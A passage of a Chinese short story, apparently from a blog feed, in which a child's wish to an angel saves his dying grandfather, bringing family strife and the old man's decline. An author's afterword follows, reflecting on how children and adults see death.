表着什么，但爷爷不可能骗我——他经常向我坦然地解释死亡。他说，他会被盖上黑布，装进箱子，在街上“行走”一番，再送到火葬场，化为尘土。每次他讲起这些的时候，我的眼前就会浮现出一场大火，一个人静静地躺在里面，皮肤一点点焦黑、内陷，逐渐变成一团灰烬。我莫名地心口发堵，眼泪会不争气地滚下去。</p><p>“傻孩子，哭什么，一切都会过去的。”爷爷总是这么说。</p><p>如今房间空荡荡的，只有几颗胶囊静静地躺在桌上。我把它往摇椅扔去，眼泪不要钱似的流出来。胶囊在扶手上弹开，滚落到地板上。没有人捡起来。</p><p>九天了。每天早上我都会被梦中的那场大火吓醒。我开始避开家中一切类似灰烬的粉状物，就连坨成一团的灰毛线都会让我心有余悸。“爷爷，我怕。”我喃喃着，声音在房间里回响。</p><p>我已经不记得我是怎样央求父母带我去医院的了。因为看到那具苍老的身躯的时候，我就只剩下了关于他的记忆。他平躺在病床上，手上胸上肚子上贴满了各式各样的金属片、插满了大大小小的管子。他的脸颊陷进骨头里，就像被火烧过一样；他的眼紧闭着，似乎没有了呼吸。我发疯似的朝他跑去，摸他的手，摸他的脸，嘴上重复着“爷爷，我怕”。我多么希望他能坐起来，擦掉我的眼泪，说一句“傻孩子，哭什么，一切都会过去的”。可是，奇迹没能发生。他就躺在那里，安静而又绝情。</p><p>我不知道自己哭了多久。回到家里我在哭，上床睡觉时我还在哭。我一边哭着一边迷迷糊糊地睡去，被梦里可怕的场景吓醒以后爬起来继续哭。枕头湿得睡不着觉，我就直愣愣地望着窗外，声音嘶哑。窗帘没拉，房间被月光铺满。</p><p>今天的月异常的圆、异常的亮，但在大大的白玉盘中央有一个突兀的小黑点。那像是一只虫子，有一双翅膀，在月光河中忽上忽下地飞着。等它飞近以后，我才依稀地分辨出，那不是一只飞虫，那是一个人，一个天使。</p><p>“可怜的孩子。”她在我面前站定，一脸怜悯地望着我。她的出现并没有给我带来太大的惊讶。小孩子敏锐的直觉告诉我，这一切都是命中注定的。</p><p>“救救我，救救我的爷爷。”我喃喃着。</p><p>她那慈祥的脸庞上浮现一抹微笑：“你为什么相信我能救你的爷爷？你就不问问我是谁吗？”</p><p>“我知道的，你是天使。“我笃定道。她看着我，没有否认。</p><p>“你一定能救我的爷爷，对吗？”</p><p>她沉默着。</p><p>“让我的爷爷活下去，”我突然抓住她的手臂，再也抑制不住地哽咽着，“我不想让他离开我！”</p><p>“好吧。”她怜悯而又无奈地笑了笑，“我能满足你的愿望。你的爷爷再也不会离开了。可我要提醒你的是，有时候，死亡才是最好的选择。”</p><p>“如果你以后后悔了，就来找我吧。我就住在你的梦里。”</p><p>天亮了，阳光洒了进来，我躺在床上，感觉这一切就是个梦。可我又不愿相信这是个梦。父母和姑姑带着我走向医院的时候，我的心里在打鼓。有时候我走得快些，希望能早点看到爷爷生龙活虎地站在医院迎接我们；有时候我迈不动步子，害怕赶到房间里，看到的只是一具冰冷的尸体。我就这样走走停停，大人们也不管我。他们低着头，自顾自的往前走。</p><p>我们走过了三条街，我们穿过了最后一条马路。我们走过了汽车栏杆。四个穿黑色孝服的人闯进了医院的大门。父母仍低着头，叹着气；姑姑开始酝酿眼泪，水珠在眼眶边打转；而我做好了最坏的准备。爷爷的棺材已经在家里躺着了。</p><p>医院里的一切都在有条不紊地进行着。几张移动病床被推来推去，一行人在柜台前取药，护士们在病房门前聊着天。我们好不容易找到了爷爷的病房，正要敲门之时，门开了。</p><p>房间里面站满了医生，约莫有十来个。几个人在疯狂摆弄着仪器，神色有些狰狞。那个开门的医生走了出来，脸上写满了惊讶。“奇迹，真是个奇迹。”他自语着，沉浸在自己的世界里，把门关上后就往外走，甚至都没注意到门口站着的四个可怜人。</p><p>姑姑好不容易叫住了他，询问他里面的情况，而他的话震惊了除了我以外的其他三个人。</p><p>“活下来了……死气全无……肝癌细胞被清除……甚至能下床走路了……”姑姑重复着他说的话，双目呆滞，显然是被这突出其来的消息吓坏了。</p><p>爷爷还活着。听到这里，一股炽热的气流从心头升起，奔腾着涌进我的大脑。“太棒了！”我大叫一声，撒开双腿就往医院大门跑去。我不知道有多少人回头看我，我也不知道自己撞倒了多少个人，听到了多少句“看着点路，小屁孩”，我只知道在这一刻我要逃出这个压抑的地方，去呼吸外面新鲜的空气。我冲过了汽车栏杆，冲过了马路，冲进了对面的花园。从灌木丛里飞出的麻雀扑到我的脸上，我掀翻了马蜂窝，一群蜜蜂在我屁股后面追着跑。在转角处有一团烧尽的木屑，我还能从中看到隐隐跳动的火光。哦，这一切是多么令人着迷啊！</p><p>等我蹦着跳着回到病房的时候，我的嘴角还是抑制不住地向上扬。我实在是太开心了，以至于一开始都没有感觉到在病房外竟笼罩着一种压抑的气氛——姑姑和父母面对面坐着，四眼对着两眼，一言不发。我被母亲拉到身边，她用她那严肃而冰冷的神情把我的喜悦浇灭了。看样子，他们早已从听到消息的震惊中走了出来。</p><p>大人们真的是一种奇怪的生物，你永远也不知道他们脑子里装着些什么。爷爷活着明明是一件值得高兴的事，可他们的神色看起来比爷爷死了还要难看。难看也就算了，但他们非要把不开心埋在心里，也不说出来，自顾自地生着闷气。作小孩子的还不能问这是怎么回事，你只要一开口，他们那冰冷的目光就会齐刷刷地朝你身上汇聚，让你尴尬得恨不得找个洞钻进去。此时，姑姑和父母就好像大战前对战的两方军团，还未擂鼓却已在聚势，唇枪舌战尚未开始，如利剑之目光却已过了千百招。走廊上已无外人，进攻的号角即将吹响，而我就是那站在军团队尾的瑟瑟发抖的逃兵，一言不发而又战战兢兢。</p><p>姑姑率先打破沉默，她有一搭没一搭地聊着天气，母亲也随意地应和着。姑姑不自然地搓着自己的双手，不时地抠着手指甲上的污垢。母亲频繁地整理着自己的衣领，偶尔把头转向我，问我刚才去哪了、干什么了。我一一回答着，可我知道她不在听，她们的心思全在对方身上。她们之间的对话我听了好久，才明白她们在为爷爷以后住谁家而争执不休。</p><p>“嫂子啊，你们照顾爸十几年了。我在这方面没经验。我要是招待不周了，万一有个三长两短的，后悔也来不及。”</p><p>“小姑子，话不能这么说，不会可以学嘛！况且，我是替你着想。邻里哪个不对你的不孝指指点点？让爸在你那住上几年，这些流言自然就有多远滚多远了。”</p><p>“孝心我自己懂就行，犯不着别人为我担心。我一个人过惯了……”</p><p>“……你一个人，自然方便。我们累死累活地把毛毛养大，现在他的学费还没着落呢！”</p><p>对于势均力敌的双方而言，仗只会越打越凶，丝毫没有停止的架势。爷爷就像猫爪下的一团毛线，被无情地抛来抛去，不时的还被人啐上一口唾沫。现在我才意识到父母为了养我和爷爷背负了多大的责任。我自然是站在母亲这一边的，可我一想到那躺在摇椅上单薄的身影要被我们赶出门去，我又止不住地心酸。</p><p>心平气和的讨论，变成了剑拔弩张的争吵，最后又不可避免地变成歇斯底里的尖叫。母亲气得眼珠子都快蹦出来了，她指着姑姑的食指在空中乱颤：“你个没良心的白眼狼！依我看爸是不该生你！”</p><p>姑姑也不甘示弱：“你要是硬把他塞给我，我就跟他一刀两断！”</p><p>在利益面前，羞耻心是要让步的。走廊上逐渐挤满了来看热闹的人，可她们却丝毫不见收敛。眼见着音调越来越高，语言越来越不堪入耳，那个一直被忽视的病房门开了，爷爷走了出来。尖叫声戛然而止。</p><p>那张脸已不再慈祥。它上面写满了羞愧、懊悔、遗憾与无奈的字样；脊背挺得笔直，但也弱不禁风；那苍白的头发在空中摆动，它似乎变得更白了。天使的魔力赋予了他力量，让他看起来像是年轻了十岁。可我又不可避免地意识到，此刻的他比平常任何时候都要疲惫，都要衰老。</p><p>我的脚步不由自主地向前跨去，却被我爸拉了回来。爷爷转过头来，他那模糊不清的眼神在我身上停留。我不敢直视他。许久，他移开了视线，踏着铿锵的步伐朝医院大门走去。</p><p>他要离开。他要去哪？</p><p>我们四人都不约而同地迈出步子，跟在他后面。这时他停下了，甩下一句话。</p><p>你们自己忙自己的，不要管我。</p><p>他走了，我在他踱步离去的身影中看到了落寞。爸爸张了张嘴想要说一句挽留的话，可他最后还是什么都没说。母亲和姑姑倒是解脱般地呼出一口浊气，后者从衣兜里拽出几张已经撕碎的纸片，一脸遗憾地把它们丢进了垃圾桶。</p><p>爷爷活着，但他还是离开了我。我这才从胜利的迷惘中清醒过来。悲痛赋予了我们反思的权力。我回想起天使说的那几句话，“死亡才是最好的选择”是什么意思？难道说，爷爷如今出走，是他活着的必然后果吗？</p><p>回到家，父母望着客厅那口棺材，陷入了沉思。姑姑收拾东西走了。姑姑原本是多么乐观的人啊，爷爷重病期间她还能对着一张遗产转让书笑，可今天这么一闹，她直接在病房外把那张纸撕了。爷爷活着不应该是值得高兴的事吗？那她们去寺庙拜佛烧香祈的是什么呢？我感觉这一切实在是太过晦涩难懂了。</p><p>我站在院子里，空落落地望着爷爷的房间。我试着幻想爷爷离开我们后会过怎样的生活，可是小升初的学业压力与父母的期望迫使我放弃这种无意义的思考。有时候，我注意到墙边倒下的铁锹，会想起那些无忧无虑的下午，爷爷想打又不忍心打我的模样；可大多时候，我会忘了在我们家里，还曾有过这样一位“客人”。</p><p>都说时间是治愈伤痛的良药，我也渐渐适应了没有爷爷的生活。父母托了关系，让我去异地的初中读书，这一去就是三年。一个人的生活也让我完成了蜕变，挤入“小大人”的行列。当我拖着行李箱和疲惫的身躯回到家时，这种落叶归根的感觉让我处于城市喧嚣中的躁动也安静了下来。</p><p>推开门，父母不在，但爷爷房间的门虚掩着。我放下行李，脱下外套，伸手顶开爷爷房间的门的时候，我看见了三年前的那一幕——</p><p>爷爷靠在摇椅上，摇椅前后摆动，咯吱咯吱地响着。他望着窗外，丝毫没有感觉到我的到来。桌上放着一本《唐诗鉴赏词典》，一包面巾纸，一罐棉签。院子里微风徐徐，铁锹靠在墙壁上，发出“叮叮当当”空灵的响声。长春树已经长得跟墙壁一样高，打出一片片绿细油的叶子，棕黄的树干苍劲有力，凹凸不平的纹理显示着岁月的痕迹。几只麻雀环绕着树枝唱歌——不多不少，正好五只。那樟树和柳树呢？我再凑前一看，那里只剩下了两个死气沉沉的树墩子。</p><p>爷爷回过头来，他看到了我。他还是那张慈祥的脸，只是有那温和之中多了几分沧桑。脸上那些层层叠叠的褶皱，因为他见到我之后浮现的笑容，变得更深了。四目相对之时，我正想着如何表达再见到他的欣喜与激动之情，他先说话了，用一种异常兴奋的语调。</p><p>“阿丽！是你吗，阿丽？”</p><p>阿丽？那不是我奶奶的名字吗？</p><p>“爷爷，你认错了，我是毛毛啊，不是……”</p><p>“我就知道我还能看见你！”他一跃而起，把我抱在怀里，“那些老家伙硬说到了天堂也只能一个人生活——我知道他们在骗我，毕竟他们也不希望我寻死。对不起，阿丽。我让你在天堂孤独地多待了两年。原谅我，好吗？我知道你宽宏大量，一定会原谅我的。毕竟我来陪你了，不是吗？”</p><p>爷爷高兴得上蹦下跳，像一个小孩子。</p><p>“阿丽你看！”他指着院子里那棵长寿树苗，“毛毛都长这么大了。他真是个可爱的小孩子。他还说我是那黑不溜秋的老铁锹呢！”这时他挠了挠头，有些不好意思，“我也感觉我是。老实巴交的，常受人欺负。不过你不就是因为这点才爱上我的吗？”</p><p>我好不容易从他的怀抱里挣脱出来，狼狈地跑出房间。爸妈已经回来了，正在厨房里准备晚饭。我出房间的时候，他们朝我点点头，算是打招呼了。</p><p>“爷爷什么时候回来的？他今天说话怎么怪怪的？”我尚未从震惊的心情中缓过神来。</p><p>母亲比我还要震惊，她手中没剥完的毛豆直接掉在了地上。“你说什么？爷爷说话了？”</p><p>“对啊。”我用三言两语把爷爷说的话重复了一遍。</p><p>父母意味深长地对视了一眼，难掩眼中的惊讶之色。</p><p>爷爷一年前就回来了。他不是自己走回来的，而是被别人抬回来的。天知道他离开医院那两年经历了什么。那个好心人说，他看到爷爷在桥上一脸坚毅地跳下去，跳进我们家附近的那条河里。他把他救了上来，抬回我们家。之后爷爷就一直住在家里，但是一句话也不说，就瞅着那院子发呆。</p><p>“爷爷怎么会跳河呢？”我神色复杂地望着爷爷房间的那扇门。</p><p>“那人还说，他跳河的时候，大喊了声阿丽。”</p><p>这时爷的声音透过房门穿过来：“阿丽啊，我就不该让你去那河里洗衣服的。都怪我，穷得买不起干净的水。可是，你也好狠心。”</p><p>我把头撇到一边，努力不让眼泪流出来。</p><p>“院子里……那两棵树呢？”</p><p>母亲叹了口气。“砍了卖钱了。”</p><p>夜深了，我靠在窗边，没有睡。我在偷听父母卧室的谈话。他们在吵架，吵得很凶。他们果然不像表面上那么和睦。院子里的风在簌簌地吹。</p><p>“我早跟你说过要把他送养老院了。”那是母亲的声音，“你非得让他住咱家。你也看到了，我们过得有多苦。我勉强答应你，是看在那套挂着他名字的房子的分上。养个老人有什么用呢？哑巴也就算了，他还是个精神病人！我告诉你，这次一定要把他送去精神病院！”</p><p>父亲嘀咕了些什么，我没有听清。</p><p>“你以为爱能当饭吃吗！”母亲叫道，“我告诉你，你要是不送，咱们就离婚！反正这日子我也是过够了！”</p><p>父亲最终还是妥协了。爷爷没有得到医院开的证明就被送往了精神病院。我牵着爷爷的手在病院里逛着，看着形形色色的举止怪异的人，爷爷在他们当中乖巧得像个孩子。一想到爷爷以后要和他们待在一起，我内心就会涌起一股负罪感。在离别之前，我找了个借口，带着爷爷去逛街。</p><p>我们在街上漫步，爷爷有时候左顾右盼，好奇地望着橱窗里的东西；有时候眼神迷离，想着自己的心事。我把握住他的那只手紧了紧，生怕他跑丢了。</p><p>突然，他抬起头说道：“爸爸，你回来了。”我看着他，在他的眼中，我仿佛成了那个穿着被水泥溅满的工装的刚回到家的父亲。我有些忍俊不禁，昨天成了阿丽，今天作了父亲，我这辈分也是越说越大了。</p><p>笑归笑，戏还是要做的。我也不知道爷爷是否有着清醒的意识，还是他现在活在过去记忆的片段里。“嗯，回来了。”我柔声说道。他一脸满足地点点头，脚步又轻灵了几分。</p><p>他拽着我的手在街上看这看那，眼睛中永远带着新奇的光芒，好像是他第一次逛街似的。他在街头一个卖棉花糖的小摊旁站了许久，一脸痴迷地看着在那不停旋转的轮盘上结出的五颜六色的“花”。那个摊主异样地瞥了爷爷一眼，估计是没想到这么大年纪的人竟然对棉花糖感兴趣。</p><p>“爸，给我买一朵吧。”他站在那里犹豫半天，最终还是满脸乞求之色地说道。</p><p>我正打算在衣兜里找钱的时候，才意识到自己身无分文。我手足无措地胡乱摸找着，一边掩饰自己的尴尬神色，一边在想着自己待会儿要如何安慰这个六十多岁的“孩子”。</p><p>“爸！”爷爷突然把手从我的怀里抽走，双手抱头，眼睛里满是惊恐与懊悔。他那羸弱的身子蜷缩着，在飒飒的凉风中显得单薄、无力而又令人同情。我看着他，不知道发生了什么。</p><p>“爸！别打我了，爸！”他一个人在空地上左躲右闪，眼睛隐在遮掩的双臂背后。他仿佛看到他父亲的拳头无情地落在他身上，“我知道错了，我不买了！不买了!”</p><p>说完这话的时候，他不再闪躲。他渐渐把手放下，一脸畏惧地看着我站的位置。我看到有什么晶莹的东西在他的眼角闪了一下。“呜呜——”泪水夺眶而出，在他满是皱纹的沟壑中堆砌，然后顺着脸颊外沿在下巴处汇聚，清脆地打在地上。他的肩膀一耸一耸着，饱经风霜的脸扭曲着，小孩子般委屈的神色不和谐地嵌印在苍老的面颊上，这一幕极富戏剧性却又让人笑不出来。</p><p>爷爷哭了，我也哭了。我们俩头靠着头坐在台阶上，他哭“我”的无情，我哭他的无助。他泪眼婆娑地看着我，想起了他的父亲，他的童年，他的阿丽，他的痛苦；而我泪眼婆娑地看看他，想起了那从摇椅上站起来捡药的身影，那在医生怀里拽着被单的身影，那插着管子躺在病床上的身影，那留下落寞背影的走出医院大门的身影。他哭得差不多了，看到我哭，又忍不住号啕起来。一直到太阳快落的时候，我们才停下来。我伸手擦了擦残留在他眼角的泪珠，然后把他送回病院。回到家时，我把自己反锁在爷爷的房间里，再一次号啕大哭。</p><p>晚上，我让窗帘开着。满月的光辉一层又一层地铺满房间。铁锹“叮当”的声音回荡在院子里，风又紧了些，吹得长寿树苗东倒西歪。我躺在摇椅上，双眼的红肿还未褪去。疲惫爬上了我的身体。</p><p>“你找我？”那个天使出现在我的面前。她一脸慈祥地站在月光下，景是三年前的景，可人已不是三年前的人。</p><p>我呼出一口浊气，双眼迷离。</p><p>“怎么，后悔了？”她缓缓落地，在我身边坐下。我重重地点了点头。</p><p>“讲点什么吧。”她那柔和的声音宛如天籁，抚平我内心繁杂的思绪。</p><p>“我真的……太自私了。”一句话没说完，我就止不住地哽咽起来。她就静静地坐着。我好不容易才把情绪平稳下来。“爷爷其实巴不得早点走，而我却因为自己没人陪伴而硬把他留了下来。他死前已经看开了，他不愿再体会人情的冷漠，因而选择了死亡。哎，他肯定知道，他的存在是我们家和姑姑家生活下去最大的阻碍了。”</p><p>“爷爷这一生过的肯定很苦。小时候他爸不给他买棉花糖，结婚了他又为生计所困，奶奶又走得早，他又得了肝癌、成了累赘，死亡是多么可遇不可求的解脱啊！”我低下头，颤抖着，“我恨我自己，让他活在了永无止境的痛苦之中。”</p><p>“你明白了。”她轻声说着。</p><p>“我恨我自己没能明白得早些。”</p><p>她神色复杂地望着我，沉默良久。</p><p>“小时候我是多么盼着长大啊。可长大之后，小时候的无忧无虑已经再也回不来了。”我把脸埋在手里，“原来，无知是一种幸福。唯一遗憾的是，这种幸福却是以他人的痛苦为代价。”</p><p>她把我抱在怀里，我看着院子里那棵满是刮痕的长寿树，树叶在风中颤抖着，仿佛能感受到我的悲伤似的。</p><p>“我多么希望这是一场梦。一觉醒来，回到三年之前。”我喃喃着。</p><p>她突然笑了，笑得很灿烂：“这个愿望，我可以帮你实现。”</p><p>天亮了，阳光洒了进来。敲门声突兀地响起，我开了门，看到姑姑和父母穿着黑色孝衣站在我面前。</p><p>“赶紧穿上孝衣，我们马上去医院。”母亲催促着。我瞥见了客厅里那口棺材。</p><p>“爷爷呢？”我隐晦地露出一丝微笑。</p><p>“你这小子，哭糊涂了吧！”姑姑插嘴道，“昨天你不在急诊室看他来着？”</p><p>“他的病好了没？”</p><p>“开玩笑，肝癌没恶化就已经万事大吉了，你还指望他能好？”姑姑没好气地说道，“动作利索点！”</p><h1 id="尾声">尾声</h1><p>麻雀显然不知道今天是什么重要的日子。街上锣鼓敲得震天响，害得它们都不能睡个好觉。几只麻雀绕着樟树和柳树，叽叽喳喳地在宣扬它们的不满。</p><p>院子里走进来一对母子，小孩子在哭，而母亲在安慰他。</p><p>“傻孩子，别哭了，一切都会过去的。”母亲抹去他眼角的眼泪，她的语气中带有一丝自豪，为她儿子的孝心而自豪。姑姑站在院子门口，满脸的忧愁。</p><p>母亲和孩子走到那三棵树前。母亲抚摸着那棵尚幼的长寿树苗，孩子看到那后面两棵仍郁郁葱葱的樟树和柳树，像是想起了什么般，哭得更凶了。</p><p>而原本那把靠在墙边的黑不溜秋的老铁锹，早已不知道被风吹到哪个角落里去了。</p><p><img src="/img/novel/1.jpeg"></p><h1 id="创作谈">创作谈</h1><p>以小孩子的视角观察成人的世界，或许有些可爱、有些心酸，也有些搞笑吧？天真与无知赋予了小孩子无忧无虑的权力，让他们以“善”简单化处理这个纷繁的世界。可是，这个世界注定是复杂的，自私、邪恶、苦难因人之社会性永远有其容身之地，孩子们对世界的正向处理必将导致他们有不懂之处。天下父母常说：“等你长大了自然就懂了。”为了理解这个世界，他们是有多盼望长大啊！但长大以后呢？当他们发现自己本就处于利益与欲望的黑暗之中时，当他们意识到身边的大人不得不因尔虞我诈而小心翼翼、身心俱疲时，当他们连自己也不得不承认自私的存在并偶尔被其所迷惑时，他们又有多后悔长大，多同情人类——这个在宇宙面前连沧海一粟都算不上的造物啊。</p><p>这篇文章所展现的“死亡”，只是小孩与大人观念差异的其中之一。小孩眼中的“死亡”与“怪兽”相差无几，身边的亲人走了，就是被怪兽吃了，因此他们极力反对死亡，若是有能力，他们恨不得让“死亡”在这个世界消失；大人眼中的“死亡”，是无奈，是后悔，是不舍，是留恋，是仍未功成名就的壮志难酬，是看破红尘的解脱与豪放……他们也会有如孩童般的畏惧，但当死亡切切实实地降临在他们身上时，他们又会觉得这一切都是理所应当，水到渠成——生命总是周而复始的。接纳不可避免的苦难，这正是人类得以延续的伟大之处。更何况，难道死亡就一定意味着生命的终点吗？常言道，好死不如赖活。但当这个话题上升至人生意义与价值层面时，是生是死，这个问题的答案就变得扑朔迷离了。</p><p>长大后的毛毛认为，爷爷把死看作了一种解脱。可这何尝不是一种不得为而为之的无奈呢？死亡对一个人来说意味着什么，每个人都有自己的答案。至于写这篇文章的目的，只是想提供一个引子，让读者从具象化的繁忙中暂时抽离出来，思考生命的终点为何，思考这一生忙碌奔波又是为何。</p>]]></content>
    
    
    <categories>
      
      <category>Novel</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
